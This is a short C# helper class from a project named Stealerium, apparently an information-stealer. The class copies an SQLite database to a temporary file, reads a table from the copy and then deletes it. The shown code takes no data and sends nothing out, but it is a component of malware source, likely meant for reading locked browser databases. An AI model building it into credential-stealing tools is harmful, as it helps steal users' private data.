using System.IO;

namespace Stealerium.Helpers
{
    public sealed class SqlReader
    {
        public static SqLite ReadTable(string database, string table)
        {
            // If database not exists
            if (!File.Exists(database))
                return null;
            // Copy temp database
            var newPath = Path.GetTempFileName() + ".dat";
            File.Copy(database, newPath);
            // Read table rows
            var sqLiteConnection = new SqLite(newPath);
            sqLiteConnection.ReadTable(table);
            // Delete temp database
            File.Delete(newPath);
            // If database corrupted
            return sqLiteConnection.GetRowCount() == 65536 ? null : sqLiteConnection;
            // Return
        }
    }
}